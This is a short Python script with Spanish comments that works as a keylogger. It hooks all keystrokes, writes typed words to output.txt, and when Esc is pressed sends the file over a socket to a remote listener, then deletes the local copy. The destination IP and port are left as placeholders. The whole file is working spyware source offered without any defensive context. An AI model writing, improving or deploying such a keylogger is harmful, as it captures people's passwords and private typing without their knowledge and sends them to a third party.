import keyboard
import sys
import socket
import os

palabra = ""

# Funcion la cual comprueba que tecla fue presionada
def pulsacion_tecla(pulsacion):

    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == "space" or pulsacion.name == "enter" or pulsacion.name == "tab":
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name

keyboard.hook(pulsacion_tecla)

# Funcion que detecta cuando hay un espacio y guarda la palabra formada antes de borarrla
def guardar_palabra_al_espacio():
    with open("output.txt", "a") as file:

        file.write(palabra + "\n")
    print(f"Palabra registrada {palabra}")
    resetear_palabra()

# Funcion para borrar el valor de la variable "palabra"
def resetear_palabra():
    global palabra
    palabra = ""

# Funcion para enviar lo recopilado hacia un servidor en escucha
def enviar_archivo_via_socket(archivo_a_enviar, direccion_ip_destino, puerto_destino):
    try:
        with open(archivo_a_enviar, "rb") as file:
            contenido = file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            conexion.connect((direccion_ip_destino, puerto_destino))
            conexion.sendall(contenido)
            os.remove("output.txt")
            sys.exit
    except Exception as e:
        print("Hubo un error en la conexion: ", e)

# Funcion para detener el script y enviar lo recopilado
def detener_script():
    keyboard.unhook_all()
    enviar_archivo_via_socket(archivo_a_enviar, direccion_ip_destino, puerto_destino)

# Se define hacia donde sera enviado el archivo
direccion_ip_destino = "ip"
puerto_destino = "puerto"
archivo_a_enviar = "output.txt"

# Comprueba el momento en el que se debe finalizar el script
try:
    keyboard.wait("esc")
    detener_script()
except KeyboardInterrupt:
    print("Script detenido")
    pass
